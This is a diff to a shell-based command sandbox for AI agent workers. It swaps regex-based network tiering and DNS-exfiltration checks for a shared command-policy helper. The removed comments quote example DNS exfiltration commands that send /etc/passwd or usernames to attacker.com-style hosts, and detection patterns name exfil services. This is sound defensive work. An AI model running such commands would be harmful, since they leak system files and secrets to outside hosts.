@@ -8,10 +8,11 @@
 # temp directory isolation, optional network restriction, and network tiering.
 # Inspired by OpenFang's WASM sandbox — adapted for shell-native use.
 #
-# Network tiering (t1412.3): When --network-tiering is enabled, commands that
-# access the network have their target domains classified into tiers (1-5).
-# Tier 5 domains (exfiltration indicators) are logged and flagged. Tier 4
-# (unknown) domains are allowed but flagged for post-session review.
+# Network tiering (t1412.3): recognized direct network clients have target
+# domains classified into tiers (1-5). Tier 5 and direct DNS-exfiltration
+# commands are blocked before execution. Tier 4 domains are allowed but flagged.
+# Arbitrary interpreter scripts/custom binaries require a lower-layer egress
+# backend; command classification is not whole-process network containment.
 # See network-tier-helper.sh for the full tier model.
 #
 # Usage:
@@ -50,11 +51,8 @@ readonly SECRET_IO_GUARD_DEFAULT="true"
 # Minimal environment passthrough — only what's needed for basic operation
 readonly DEFAULT_PASSTHROUGH="PATH HOME USER LANG TERM SHELL"
 
-# Network tier helper (t1412.3)
-readonly NET_TIER_HELPER="${SCRIPT_DIR}/network-tier-helper.sh"
-
-# Quarantine helper (t1428.4)
-readonly QUARANTINE_HELPER="${SCRIPT_DIR}/quarantine-helper.sh"
+# Runtime-neutral shell-command policy helper
+readonly COMMAND_POLICY_HELPER="${AIDEVOPS_COMMAND_POLICY_HELPER:-${SCRIPT_DIR}/command-policy-helper.py}"
 
 # =============================================================================
 # Helpers
@@ -65,6 +63,7 @@ log_sandbox() {
 	local msg="$2"
 	printf '[%s] [%s] [%s] %s\n' \
 		"$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$LOG_PREFIX" "$level" "$msg" >&2
+	return 0
 }
 
 # Log execution to JSONL audit trail
@@ -255,154 +254,66 @@ _sandbox_emit_redacted_output() {
 	return 0
 }
 
-# =============================================================================
-# Network Tiering Integration (t1412.3)
-# =============================================================================
-
-# Extract domains from a command string and check them against network tiers.
-# Best-effort heuristic: parses URLs and hostnames from common patterns
-# (curl, wget, git clone, npm install from URL, etc.).
+# Enforce the shared runtime-neutral command safety floor.
 # Arguments:
-#   $1 - command string
-#   $2 - worker ID for logging
-_sandbox_check_network_tiers() {
-	local command="$1"
-	local wid="$2"
+#   $1 - exact argv JSON array
+#   $2 - worker ID
+_sandbox_check_command_policy() {
+	local argv_json="$1"
+	local worker_id="$2"
+	local result=""
+	local status=0
+	local decision=""
+	local rule_id=""
+	local reason=""
 
-	# --- DNS exfiltration shape detection (t1428.1, CVE-2025-55284) ---
-	# Check for DNS tool usage with dynamic data BEFORE domain extraction.
-	# DNS exfil encodes stolen data as subdomain labels — the destination
-	# domain is often attacker-controlled and unknown to our tier list.
-	# Detecting the command SHAPE catches exfil regardless of destination.
-	_sandbox_check_dns_exfil "$command" "$wid"
-
-	# Extract potential domains from the command using multiple strategies:
-	# 1. Full URLs: https://domain.com/... or http://domain.com/...
-	# 2. Bare hostnames after networking tools: curl example.com, wget host.io
-	# 3. Git SSH patterns: git@github.com:user/repo.git
-	# 4. SCP-style: scp file user@host.example.com:/path
-	# 5. DNS tools: dig domain.com, nslookup domain.com, host domain.com
-	# Excludes: @scope/package (npm), single-label names (localhost, etc.)
-	local domains=""
-	local url_domains bare_domains git_ssh_domains dns_domains
-
-	# Strategy 1: Extract domains from http(s) URLs
-	url_domains="$(printf '%s' "$command" | grep -oE 'https?://[a-zA-Z0-9._-]+' | sed -E 's|https?://||')" || true
-
-	# Strategy 2: Extract bare hostnames after networking tools that take a URL/host
-	# as their primary argument (curl, wget, etc.). Tools where arguments are mixed
-	# (scp, rsync) are handled by Strategy 3 via user@host patterns instead.
-	# Requires TLD of 2+ alpha chars to avoid matching filenames like "file.txt"
-	# and excludes common file extensions (.sh, .py, .js, .json, .txt, .log, .yml, .yaml, .md, .conf)
-	bare_domains="$(printf '%s' "$command" | grep -oE '(curl|wget|fetch|nc|ncat|telnet)\s+(-[a-zA-Z0-9]+\s+)*([a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,})' | grep -oE '[a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,}$' | grep -vE '\.(sh|py|js|ts|json|txt|log|yml|yaml|md|conf|cfg|xml|html|css|gz|tar|zip)$')" || true
-
-	# Strategy 3: Extract hosts from user@host patterns (git SSH, ssh, scp, etc.)
-	# Matches both git@github.com:user/repo and user@server.example.com
-	git_ssh_domains="$(printf '%s' "$command" | grep -oE '[a-zA-Z0-9_-]+@([a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,})' | sed 's/.*@//')" || true
-
-	# Strategy 4 (t1428.1): Extract domains from DNS tool arguments
-	# Catches: dig example.com, nslookup evil.io, host attacker.net
-	# Strips flags (dig +short, dig @resolver), trailing dots (FQDN notation),
-	# and record types (A, AAAA, TXT, MX, etc.)
-	dns_domains="$(printf '%s' "$command" | grep -oE '\b(dig|nslookup|host)\s+[^|;&]*' | sed -E 's/\b(dig|nslookup|host)\s+//' | grep -oE '[a-zA-Z0-9]([a-zA-Z0-9_-]*\.)+[a-zA-Z]{2,}\.?' | sed 's/\.$//' | grep -vE '^\$|^`')" || true
-
-	# Combine and deduplicate all extracted domains
-	domains="$(printf '%s\n%s\n%s\n%s' "$url_domains" "$bare_domains" "$git_ssh_domains" "$dns_domains" | grep -v '^$' | sort -u)" || true
-
-	if [[ -z "$domains" ]]; then
+	if [[ ! -f "$COMMAND_POLICY_HELPER" ]]; then
+		log_sandbox "ERROR" "Required command policy helper is unavailable: ${COMMAND_POLICY_HELPER}"
+		return 1
+	fi
+	result="$(python3 "$COMMAND_POLICY_HELPER" check-command --worker --worker-id "$worker_id" --cwd "$PWD" --argv-json "$argv_json")" || status=$?
+	decision="$(printf '%s' "$result" | jq -r '.decision // empty' 2>/dev/null)" || decision=""
+	rule_id="$(printf '%s' "$result" | jq -r '.rule_id // "policy.invalid-response"' 2>/dev/null)" || rule_id="policy.invalid-response"
+	reason="$(printf '%s' "$result" | jq -r '.reason // "command policy returned an invalid response"' 2>/dev/null)" || reason="command policy returned an invalid response"
+	if [[ "$status" -eq 0 && "$decision" == "allow" ]]; then
 		return 0
 	fi
+	log_sandbox "ERROR" "Command policy denied execution (${decision:-forbid}, ${rule_id}): ${reason}"
+	return 1
+}
 
-	local domain tier_result
-	while IFS= read -r domain; do
-		[[ -z "$domain" ]] && continue
-		tier_result="$("$NET_TIER_HELPER" classify "$domain")" || true
+# Serialize exact argv without shell joining or delimiter ambiguity.
+_sandbox_argv_json() {
+	python3 - "$@" <<'PY'
+import json
+import sys
 
-		if [[ "$tier_result" == "5" ]]; then
-			log_sandbox "WARN" "Network tier DENY: ${domain} (Tier 5 — exfiltration indicator)"
-			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-deny" || true
-			# Quarantine denied domains for review — user may want to allow (t1428.4)
-			if [[ -x "$QUARANTINE_HELPER" ]]; then
-				"$QUARANTINE_HELPER" add \
-					--source sandbox-exec \
-					--severity HIGH \
-					--category denied_domain \
-					--content "$domain" \
-					--worker-id "$wid" \
-					>/dev/null 2>&1 || true
-			fi
-		elif [[ "$tier_result" == "4" ]]; then
-			log_sandbox "INFO" "Network tier FLAG: ${domain} (Tier 4 — unknown domain)"
-			# Note: Tier 4 quarantine is handled by network-tier-helper.sh log_access
-			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-flag" || true
-		else
-			# Tiers 1-3: log silently (tier helper handles routing)
-			"$NET_TIER_HELPER" log-access "$domain" "$wid" "pre-check-allow" || true
-		fi
-	done <<<"$domains"
-
+print(json.dumps(sys.argv[1:]))
+PY
 	return 0
 }
 
-# Detect DNS exfiltration command shapes (t1428.1, CVE-2025-55284).
-# DNS exfil encodes stolen data as subdomain labels in DNS queries:
-#   dig $(cat /etc/passwd | base64).attacker.com
-#   nslookup $(whoami).evil.example
-#   echo "secret" | base64 | xargs -I{} dig {}.attacker.com
-# These bypass HTTP-layer controls because DNS resolution is typically
-# unrestricted. Existing Tier 5 blocks known exfil services but not
-# attacker-owned domains. This function catches the command SHAPE.
-# Arguments:
-#   $1 - command string
-#   $2 - worker ID for logging
-_sandbox_check_dns_exfil() {
-	local command="$1"
-	local wid="$2"
-	local dns_exfil_detected=false
+# Produce a display-only, shell-escaped command string for logs and legacy
+# secret-output heuristics. It is never used for policy decisions or execution.
+_sandbox_argv_display() {
+	python3 - "$@" <<'PY'
+import shlex
+import sys
 
-	# Pattern 1: DNS tool with command substitution ($(...), ${...}, `...`)
-	if printf '%s' "$command" | grep -qE '\b(dig|nslookup|host)\b.*(\$\(|\$\{|`)'; then
-		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS tool with command substitution (worker=${wid})"
-		dns_exfil_detected=true
-	fi
+print(" ".join(shlex.quote(arg) for arg in sys.argv[1:]))
+PY
+	return 0
+}
 
-	# Pattern 2: base64/encoding piped to DNS tool
-	if printf '%s' "$command" | grep -qE '\b(base64|xxd|od[[:space:]]+-[AaxX]|hexdump)\b.*\|[[:space:]]*(dig|nslookup|host)\b'; then
-		log_sandbox "CRIT" "DNS EXFIL DETECTED: Encoded data piped to DNS tool (worker=${wid})"
-		dns_exfil_detected=true
-	fi
+# Produce heuristic-only text for legacy secret-output pattern matching. This
+# never feeds policy decisions or command execution; exact argv remains the
+# authority for both.
+_sandbox_argv_heuristic_text() {
+	python3 - "$@" <<'PY'
+import sys
 
-	# Pattern 3: DNS tool inside a loop (bulk exfil)
-	if printf '%s' "$command" | grep -qE '\b(for|while)\b.*\b(dig|nslookup|host)\b.*\bdone\b'; then
-		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS tool inside loop construct (worker=${wid})"
-		dns_exfil_detected=true
-	fi
-
-	# Pattern 4: DNS-over-HTTPS with dynamic data
-	if printf '%s' "$command" | grep -qE '(dns-query|dns\.google|cloudflare-dns\.com/dns-query|doh\.).*(\$\(|\$\{|`)'; then
-		log_sandbox "CRIT" "DNS EXFIL DETECTED: DNS-over-HTTPS with dynamic data (worker=${wid})"
-		dns_exfil_detected=true
-	fi
-
-	# Pattern 5: Known DNS exfiltration service domains
-	# These are attacker-controlled DNS logging services. Any DNS query or
-	# HTTP request to these domains is a strong exfil indicator.
-	if printf '%s' "$command" | grep -qiE '\b(dnslog\.cn|ceye\.io|interact\.sh|burpcollaborator\.net|oastify\.com|oast\.(fun|me|live))\b'; then
-		log_sandbox "CRIT" "DNS EXFIL DETECTED: Known exfiltration service domain (worker=${wid})"
-		dns_exfil_detected=true
-	fi
-
-	if [[ "$dns_exfil_detected" == true ]]; then
-		# Log to audit trail if available
-		local audit_helper="${SCRIPT_DIR}/audit-log-helper.sh"
-		if [[ -x "$audit_helper" ]]; then
-			"$audit_helper" log security.event \
-				"DNS exfiltration command shape detected" \
-				--detail "worker=${wid}" \
-				--detail "command=${command:0:200}" 2>/dev/null || true
-		fi
-	fi
-
+print(" ".join(sys.argv[1:]))
+PY
 	return 0
 }
 
@@ -1144,34 +1055,25 @@ _sandbox_run_check_secret_guard() {
 	return 0
 }
 
-# Run pre-execution checks: log intent, run network tiering, detect taint.
+# Log execution intent and detect secret-tainted output.
 # Prints "true" or "false" to stdout to indicate whether the command is tainted.
 # Arguments:
-#   $1 - cmd_str
+#   $1 - display command string
 #   $2 - timeout_secs
 #   $3 - block_network (true|false)
 #   $4 - network_tiering (true|false)
-#   $5 - worker_id
+#   $5 - heuristic-only command text
 _sandbox_run_pre_exec() {
 	local cmd_str="$1"
 	local timeout_secs="$2"
 	local block_network="$3"
 	local network_tiering="$4"
-	local worker_id="$5"
+	local heuristic_text="$5"
 
 	log_sandbox "INFO" "Executing (timeout=${timeout_secs}s, network_blocked=${block_network}, tiering=${network_tiering}): ${cmd_str:0:200}"
 
-	# Network tiering pre-check (t1412.3): extract domains from the command
-	# and check them against the tier classification before execution.
-	# This is a best-effort heuristic — it catches obvious cases like
-	# "curl evil.ngrok.io" but cannot intercept runtime DNS resolution.
-	# The primary value is logging + post-session review, not hard blocking.
-	if [[ "$network_tiering" == true ]] && [[ -x "$NET_TIER_HELPER" ]]; then
-		_sandbox_check_network_tiers "$cmd_str" "$worker_id"
-	fi
-
 	local command_tainted=false
-	if _sandbox_is_secret_tainted_command "$cmd_str"; then
+	if _sandbox_is_secret_tainted_command "$heuristic_text"; then
 		command_tainted=true
 	fi
 	printf '%s' "$command_tainted"
@@ -1235,7 +1137,7 @@ _sandbox_run_parse_args() {
 sandbox_run() {
 	local timeout_secs="$SANDBOX_DEFAULT_TIMEOUT"
 	local block_network=false
-	local network_tiering=false
+	local network_tiering=true
 	local allow_secret_io=false
 	local worker_id="sandbox-$$"
 	local extra_passthrough=""
@@ -1256,12 +1158,20 @@ sandbox_run() {
 		return 1
 	fi
 
-	# Space-joined string for pattern-matching helpers (no execution)
-	local cmd_str="${cmd_args[*]}"
+	local argv_json=""
+	argv_json="$(_sandbox_argv_json "${cmd_args[@]}")" || return 126
+	local cmd_str=""
+	cmd_str="$(_sandbox_argv_display "${cmd_args[@]}")" || return 126
+	local heuristic_text=""
+	heuristic_text="$(_sandbox_argv_heuristic_text "${cmd_args[@]}")" || return 126
 
 	_sandbox_run_check_secret_guard \
-		"$secret_io_guard" "$allow_secret_io" "$cmd_str" \
+		"$secret_io_guard" "$allow_secret_io" "$heuristic_text" \
 		"$timeout_secs" "$block_network" "$extra_passthrough" || return $?
+	if ! _sandbox_check_command_policy "$argv_json" "$worker_id"; then
+		log_execution "$cmd_str" 126 0 "$timeout_secs" "$block_network" "$extra_passthrough"
+		return 126
+	fi
 
 	# Create isolated temp directory
 	local exec_id
@@ -1276,7 +1186,7 @@ sandbox_run() {
 	local stderr_file="${exec_tmpdir}/stderr"
 	local command_tainted
 	command_tainted="$(_sandbox_run_pre_exec \
-		"$cmd_str" "$timeout_secs" "$block_network" "$network_tiering" "$worker_id")"
+		"$cmd_str" "$timeout_secs" "$block_network" "$network_tiering" "$heuristic_text")"
 
 	local start_time exit_code=0
 	start_time="$(date +%s)"
@@ -1347,7 +1257,7 @@ sandbox_config() {
 	echo "  Max output:   $((SANDBOX_MAX_OUTPUT_BYTES / 1048576))MB per stream"
 	echo "  Secret guard: ${AIDEVOPS_BLOCK_SECRET_IO:-$SECRET_IO_GUARD_DEFAULT}"
 	echo "  Passthrough:  ${DEFAULT_PASSTHROUGH}"
-	echo "  Net tiering:  $([ -x "$NET_TIER_HELPER" ] && echo "available" || echo "not found")"
+	echo "  Net tiering:  enforced by shared worker command policy"
 	echo ""
 	if [[ -f "$SANDBOX_LOG" ]]; then
 		local count
@@ -1356,6 +1266,7 @@ sandbox_config() {
 	else
 		echo "  Executions logged: 0"
 	fi
+	return 0
 }
 
 # =============================================================================
@@ -1375,7 +1286,7 @@ Commands:
 Run options:
   --timeout N                Timeout in seconds (default: 120, max: 3600)
   --no-network               Block network access (macOS only, uses seatbelt)
-  --network-tiering          Enable domain classification and logging (t1412.3)
+  --network-tiering          Compatibility flag; enforcement is enabled by default
   --allow-secret-io          Bypass secret-output guard for this command only
   --worker-id ID             Worker identifier for network tier logs
   --passthrough "VAR1,VAR2"  Additional env vars to pass through
@@ -1399,7 +1310,8 @@ Security model:
   - Configurable timeout with hard kill
   - Secret-output command guard blocks likely credential leakage patterns
   - Optional network blocking (macOS seatbelt)
-  - Network domain tiering: classify, log, flag unknown domains (t1412.3)
+  - Recognized direct network clients block Tier 5 and DNS-exfiltration targets
+  - Interpreter/custom-binary traffic requires lower-layer egress containment
   - All executions logged to JSONL audit trail (jq-safe JSON, injection-proof)
   - Output capped at 10MB per stream
 HELP
@@ -1412,19 +1324,21 @@ HELP
 
 main() {
 	local cmd="${1:-help}"
+	local status=0
 	shift || true
 
 	case "$cmd" in
-	run) sandbox_run "$@" ;;
-	audit) sandbox_audit "$@" ;;
-	config) sandbox_config "$@" ;;
-	help) sandbox_help ;;
+	run) sandbox_run "$@" || status=$? ;;
+	audit) sandbox_audit "$@" || status=$? ;;
+	config) sandbox_config "$@" || status=$? ;;
+	help) sandbox_help || status=$? ;;
 	*)
 		log_sandbox "ERROR" "Unknown command: ${cmd}"
 		sandbox_help
 		return 1
 		;;
 	esac
+	return "$status"
 }
 
 # Source guard: only call main() when executed directly, not when sourced.
